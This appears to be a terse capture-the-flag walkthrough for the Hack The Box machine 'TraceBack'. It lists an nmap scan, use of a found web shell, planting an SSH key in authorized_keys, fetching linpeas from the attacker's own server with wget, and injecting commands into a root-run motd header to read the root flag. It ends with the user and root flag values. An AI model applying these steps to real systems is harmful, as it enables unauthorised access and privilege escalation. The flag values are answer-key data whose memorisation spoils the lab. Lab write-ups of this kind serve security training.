# TraceBack
```
WalkThrought

1. nmap -sC -sV 10.10.10.181 -oN TraceBackScan.txt

2. Access The http and OSINT (Xh4H)
- https://github.com/Xh4H/Web-Shells
- Make the Guessing Script -> Guessing.py
- Guessing is :  smevk.php

3. ssh-keygen & id_rsa.pub

-  How to create ssh rsa?
   : ssh-keygen
   : copy id_rsa.pub content 
   : paste  echo "id_rsa.pub content" > /home/webadmin/.ssh/authorized_keys 

4. linpeas upload
- server is : python3 -m http.server 
- wget {python3 -m http.server}/linpeas.sh

5. interesting file
- /etc/motd.d/00-header
- inject command this 
-    cat /root/root.txt
-    echo "done"
- ReConnect ssh then show the flag msg

user.txt : 8f380a0eb8354189c44d1e58fd006143
root.txt : 983133c131b5d233cc55e55aba3e9cc3
```